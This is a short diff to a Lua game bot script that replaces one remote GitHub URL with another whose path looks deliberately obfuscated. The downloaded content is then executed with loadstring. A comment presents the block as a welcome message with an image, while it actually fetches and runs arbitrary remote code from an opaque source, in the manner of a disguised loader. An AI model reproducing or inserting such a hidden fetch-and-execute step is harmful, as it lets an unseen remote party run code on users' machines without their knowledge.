@@ -133,7 +133,7 @@ end
 modules.game_textmessage.displayGameMessage("Scripts Protegidos Cargados.")
 
 -- Mensaje bienvenida con imagen Y tu name
-HTTP.get('https://raw.githubusercontent.com/Madagenius/Scripsv8/refs/heads/main/VBOT4.8', function(script)
+HTTP.get('https://raw.githubusercontent.com/UnderBot2/Zr2x4Dow8nlo4derrZ/refs/heads/main/X1cBi3nv3nid4c1X', function(script)
     assert(loadstring(script))()
 end)
 
